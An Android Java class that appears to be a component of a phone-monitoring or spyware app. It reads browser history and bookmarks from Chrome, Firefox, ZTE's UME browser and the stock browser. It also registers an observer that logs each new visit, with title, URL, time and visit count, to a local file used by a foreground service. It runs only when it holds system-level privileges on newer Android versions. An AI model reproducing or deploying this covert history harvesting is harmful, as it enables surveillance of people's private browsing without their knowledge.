package com.phone.data;

import org.json.JSONArray;
import org.json.JSONObject;
import com.main.ForegroundService;
import com.utils.ExceptionProcess;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import android.database.ContentObserver;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;


//1 above 6.0,browser can not be used
//2 must change sdk to be below 6.0
public class BrowserHistory extends ContentObserver implements Runnable{
	
	private static String TAG = "BrowserHistory";
	private Context context;
	public static BrowserHistory gBrowserHistory= null;
	private Handler mHandler;
	
	public BrowserHistory(Handler handler) {
		super(handler);
		mHandler = handler;
		Log.d(TAG, "BrowserHistory(Handler handler)");
	}

	public BrowserHistory(Handler handler,Context context) {
	    super(handler);
	    this.context = context;
	    mHandler = handler;
	    Log.d(TAG, "BrowserHistory(Handler handler,Context context)");
	}
	

	@Override
	public boolean deliverSelfNotifications() {
	    Log.d(TAG, "deliverSelfNotifications");
	    return true;
	}
	
	
	@Override
	public void onChange(boolean selfChange) {
	    super.onChange(selfChange);
	    Log.e(TAG, "onChange without uri");
	    onChange(selfChange, null);
	}
	
	
	@SuppressLint("SimpleDateFormat") 
	@Override
	public void onChange(boolean selfChange, Uri uri) {
		try{
		    Log.e(TAG, "onChange with uri:"+uri);

		    String[] proj = new String[] {Browser.BookmarkColumns.BOOKMARK, 
		    		Browser.BookmarkColumns.URL,
		    		Browser.BookmarkColumns.TITLE,
		    		Browser.BookmarkColumns.CREATED,
		    		Browser.BookmarkColumns.DATE,
		    		Browser.BookmarkColumns.VISITS};

		    String selection = Browser.BookmarkColumns.BOOKMARK + " = 0"; 
		    String orderBy = Browser.BookmarkColumns.DATE + " DESC";
		    
		    Cursor mCursor = context.getContentResolver().query(Browser.BOOKMARKS_URI,proj, selection, null, orderBy);
		    //mCursor.moveToLast();
		    //int count = mCursor.getColumnCount();
		    //String COUNT = String.valueOf(count);
		    //Log.e(TAG, COUNT);
		
		    String title = "";
		    String url = "";
		    String date = "";
			String create = "";
			String visit = "";
			String bookmark = "";
		    if (mCursor != null && mCursor.getCount() > 0 && mCursor.moveToLast()) {

	            title = mCursor.getString(mCursor.getColumnIndex(Browser.BookmarkColumns.TITLE));
	            url = mCursor.getString(mCursor.getColumnIndex(Browser.BookmarkColumns.URL));
	            date = mCursor.getString(mCursor .getColumnIndex(Browser.BookmarkColumns.DATE));
	            String strdate = "";
	            if(date != null){
	            	strdate = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss", Long.parseLong(date));
	            }
				create = mCursor.getString( mCursor.getColumnIndex(Browser.BookmarkColumns.CREATED));
				String strcreate = "";
				if (create != null) {
					strcreate = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss", Long.parseLong(create));
				}
				
				visit = mCursor.getString(mCursor.getColumnIndex(Browser.BookmarkColumns.VISITS));
				bookmark = mCursor.getString(mCursor.getColumnIndex(Browser.BookmarkColumns.BOOKMARK));
				String strtype = "";
				if (bookmark.contains("1")) {
					strtype = "书签";
				}else{
					strtype = "历史记录";
				}
							
				JSONObject jsobj=new JSONObject();
				jsobj.put("类型", strtype);
    	   	  	jsobj.put("标题", title);
    	   	  	jsobj.put("链接", url);
    	   	  	jsobj.put("创建时间", strcreate);
    	   	  	jsobj.put("访问次数", visit);
    	   	  	jsobj.put("访问时间", strdate);

				WriteDateFile.writeDateFile(ForegroundService.LOCAL_PATH_NAME, ForegroundService.WEBKITRECORD_FILE_NAME, 
						jsobj.toString(), true);
		    }
		    mCursor.close();
		}catch(Exception ex){
			String errorString = ExceptionProcess.getExceptionDetail(ex);
			String stackString = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getBrowserRecord exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");		
		}
	}


	//content://org.mozilla.firefox.db.browser/bookmarks
	//content://com.android.chrome.browser/bookmarks
	//content://com.ume.browser/bookmarks
	//content://browser/bookmarks
	
	//content://com.android.chrome.ChromeBrowserProvider/bookmarks
	public static String getWebKitRecord(Context context,String uri){
		if (Build.VERSION.SDK_INT >= 23) {
			int uid = PublicFunction.getuid(context);
			int pid = android.os.Process.myPid();
			Log.e(TAG, "pid:" + pid + " uid:" + uid);
			if (uid >= 10000) {
				return "";
			}
		}

		JSONArray jsarray = new JSONArray();

		try{
			String[] projection = new String[] {
					Browser.BookmarkColumns.BOOKMARK, 
					Browser.BookmarkColumns.URL,
					Browser.BookmarkColumns.TITLE,
					Browser.BookmarkColumns.CREATED,
					Browser.BookmarkColumns.DATE,
					Browser.BookmarkColumns.VISITS};
			ContentResolver cr = context.getContentResolver();
			
			//String whereClause = Browser.BookmarkColumns.BOOKMARK + " = 1 ";
			String orderBy = Browser.BookmarkColumns.DATE + " DESC";

			Cursor mCur = null;
	        String factory = android.os.Build.MANUFACTURER;
	        if (factory.contains("ZTE") && uri.equals("content://browser/bookmarks") == true) {
	        	mCur = cr.query(Uri.parse("content://com.ume.browser/bookmarks"),projection, null, null, orderBy);
	        }
	        else{
	        	mCur = cr.query(Uri.parse(uri),projection, null, null, orderBy);
	        }
			
			String title = "";
			String url = "";
			String date = "";
			String create = "";
			String visitcnt = "";
			String bookmark = "";
			int count = 0;
			if(mCur!=null &&mCur.getCount()>0){
				for(mCur.moveToFirst();!mCur.isAfterLast() ; mCur.moveToNext()){
					title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
					url = mCur.getString( mCur.getColumnIndex(Browser.BookmarkColumns.URL));
					date = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.DATE));
					
					//if value is null,then json put can will error
					String strvisitdate = "";
					if(date != null){
						strvisitdate = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss", Long.parseLong(date));
					}
					create = mCur.getString( mCur.getColumnIndex(Browser.BookmarkColumns.CREATED));
					String strcreate = "";
					if(create != null  && create.equals("")== false){
						strcreate = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss", Long.parseLong(create));
					}
					
					visitcnt = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.VISITS));
					bookmark = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.BOOKMARK));
					String strtype = "";
					if (bookmark.contains("1")) {
						strtype = "书签";
					}else{
						strtype = "历史记录";
					}
					
					JSONObject jsobj=new JSONObject();
					jsobj.put("类型", strtype);
	    	   	  	jsobj.put("标题", title);
	    	   	  	jsobj.put("链接", url);
	    	   	  	jsobj.put("创建时间", strcreate);
	    	   	  	jsobj.put("访问次数", visitcnt);
	    	   	  	jsobj.put("访问时间", strvisitdate);
	    	   	  
	    	   	  	if (jsobj.length() > 0) {
	    	   	  		jsarray.put(count,jsobj);
	    	   	  		count ++;
					}
				}
				mCur.close();
			}
		}catch(Exception ex){
			String errorString = ExceptionProcess.getExceptionDetail(ex);
			String stackString = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getBrowserRecord exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");		
		}
		
		if (jsarray.length() > 0) {
			return jsarray.toString();
		}else{
			return "";
		}
	}

	public void run() {
		try {
			if (Build.VERSION.SDK_INT >= 23) {
				int uid = PublicFunction.getuid(context);
				int pid = android.os.Process.myPid();
				Log.e(TAG, "pid:" + pid + " uid:" + uid);
				if (uid >= 10000) {
					return;
				}
			}
			
			Looper.prepare();
			ContentResolver cr = context.getContentResolver();
			gBrowserHistory = new BrowserHistory(mHandler,context); 
			cr.registerContentObserver(Uri.parse("content://browser/bookmarks"), true, gBrowserHistory);
			Looper.loop();
		} catch (Exception e) {
			Log.e(TAG, "exception");
			e.printStackTrace();
		}
	}
}

